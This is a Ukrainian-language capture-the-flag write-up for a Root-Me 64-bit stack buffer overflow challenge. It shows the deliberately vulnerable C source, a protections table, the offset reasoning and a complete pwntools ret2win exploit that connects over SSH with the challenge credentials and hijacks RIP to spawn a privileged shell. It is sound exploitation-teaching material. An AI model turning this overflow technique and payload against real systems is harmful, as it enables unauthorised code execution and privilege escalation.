ELF x64 - Переповнення буфера стека - базовий
Класичний ret2win

Легко PWN by pr1ncipL£
Опис завдання

Завдання ELF-x64-Stack-buffer-overflow-basic — класичний ret2win експлойт. На сервері запущений 64-бітний ELF-бінарник з вразливістю переповнення буфера стека через scanf("%s", buffer). У бінарнику присутня функція перемоги callMeMaybe(), яка запускає /bin/bash -p через execve. Мета — перехопити RIP і перенаправити виконання на цю функцію.

Вихідний код (ch35.c)
C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/

void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

int main(int argc, char **argv){

    char buffer[256];
    int len, i;

    scanf("%s", buffer);
    len = strlen(buffer); 

    printf("Hello %s\n", buffer);

    return 0;
}

Компілюється з прапорцями -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack — немає захисту від переповнення, PIE вимкнено, Full RELRO увімкнено, стек недовиконуваний. Ідеальні умови для ret2win.

Аналіз бінарника (checksec)
ЗахистСтатусЗначення
Архітектура amd64-64-little64-бітна, малий endian
RELRO Full RELRO GOT захищена, не потрібна тут
Стек Без захисту переповнення просте
NX Увімкнено шеллкод на стеку не працює
PIE PIE вимкнено (0x400000)адреси .text фіксовані
StrippedНі символи присутні

NX увімкнено — не можемо виконувати шеллкод. Однак PIE вимкнено, тому адреса callMeMaybe завжди однакова на сервері та локально (за умови однакових бінарників).

Процес експлуатації
1

Знаходження зміщення до RIP

Буфер — char buffer[256], але між ним і збереженим RIP на стеку лежить вирівнювання та збережений RBP (8 байт). Загальне зміщення, визначене експериментально: 280 байт.

rbp-0x108
buffer[256] ← введення починається тут
...
вирівнювання / заповнення (24 байта)
rbp+0x00
збережений RBP (8 байт)
rbp+0x08
збережений RIP ← перезаписуємо
2

Отримання правильної адреси

Локальний бінарник відрізняється від серверного — адреса callMeMaybe різна. Рішення: завантажити бінарник з сервера через SSH і розпарсити адресу прямо в скрипті.

[+] Завантаження '/challenge/app-systeme/ch35/ch35' до './ch35': Готово
0x4005e7 ← адреса callMeMaybe на сервері
3

Фінальний експлойт

Python
from pwn import *

s = ssh(user='app-systeme-ch35',
        host='challenge03.root-me.org',
        port=2223,
        password='app-systeme-ch35')

# завантажуємо серверний бінарник — адреси точно збігатимуться
s.download_file('/challenge/app-systeme/ch35/ch35', './ch35')

elf = ELF('./ch35')
callMeMaybe = elf.symbols['callMeMaybe']  # функція перемоги

print(hex(callMeMaybe))  # 0x4005e7

p = s.run('/challenge/app-systeme/ch35/ch35')

payload  = b'A' * 280       # заповнюємо до RIP
payload += p64(callMeMaybe)  # стрибаємо на перемогу

p.sendline(payload)
p.interactive()
